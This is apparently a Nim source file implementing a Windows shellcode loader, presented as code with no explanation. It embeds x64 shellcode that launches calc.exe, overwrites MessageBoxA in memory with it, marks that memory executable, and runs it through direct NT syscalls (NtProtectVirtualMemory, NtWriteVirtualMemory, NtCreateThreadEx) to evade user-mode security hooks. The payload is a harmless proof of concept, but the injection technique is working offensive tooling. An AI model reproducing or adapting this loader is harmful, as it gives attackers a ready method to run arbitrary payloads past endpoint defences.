import winim, strformat
include syscalls

var shellcode: array[276, byte] = [
byte 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 
0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 
0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 
0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 
0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 
0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 
0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 
0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 
0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 
0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 
0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 
0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,  ]

proc ObtainHandle(PID: DWORD): HANDLE =
    var hProc: HANDLE
    var objAtt: OBJECT_ATTRIBUTES
    var clientId: CLIENT_ID
    clientId.UniqueProcess = PID
    clientId.UniqueThread = 0.DWORD
    InitializeObjectAttributes(&objAtt, NULL , 0 , cast[HANDLE](NULL) , cast[PSECURITY_DESCRIPTOR](NULL))
    let res = NtOpenProcess(&hProc , PROCESS_ALL_ACCESS, &objAtt, &clientId)
    if res == STATUS_SUCCESS:
        return hProc
proc ObtainThreadHandle(TID: DWORD): HANDLE =
    var hProc: HANDLE
    var objAtt: OBJECT_ATTRIBUTES
    var clientId: CLIENT_ID
    clientId.UniqueProcess = 0.DWORD
    clientId.UniqueThread = TID.DWORD
    InitializeObjectAttributes(&objAtt, NULL , 0 , cast[HANDLE](NULL) , cast[PSECURITY_DESCRIPTOR](NULL))
    let res = NtOpenThread(&hProc , PROCESS_ALL_ACCESS, &objAtt, &clientId)
    if res == STATUS_SUCCESS:
        return hProc
proc funcAddr(lib, procname: string): LPVOID =
    LPVOID(GetProcAddress(LoadLibraryA(lib),procname))
proc main() =
    let hProc = ObtainHandle(GetCurrentProcessId())
    if hProc == 0:
        return
    var msgboxA = funcAddr("user32.dll","MessageBoxA")
    echo(sizeof(shellcode))
    var oldAccess: ULONG
    var writtenBytes: SIZE_T
    var regSize = SIZE_T(sizeof(shellcode))
    let okProtect = NtProtectVirtualMemory(hProc, &msgboxA, &regSize, PAGE_EXECUTE_READWRITE, &oldAccess)
    if okProtect == 0:
        echo("[+] Protection [RWX] OK!")
    let okWrite = NtWriteVirtualMemory(hProc, msgboxA, PVOID(addr shellcode), shellcode.len(), &writtenBytes)
    if okWrite == 0:
        echo(fmt"[+] Write OK! {writtenBytes} Bytes.")
    var thread: HANDLE
    let okThread = NtCreateThreadEx(&thread, 0x1FFFFF, NULL, hProc, cast[LPTHREAD_START_ROUTINE](msgboxA), NULL, FALSE, 0, cast[SIZE_T](NULL),cast[SIZE_T](NULL) , NULL)
    if okThread == 0:
        WaitForSingleObject(thread,INFINITE)

main()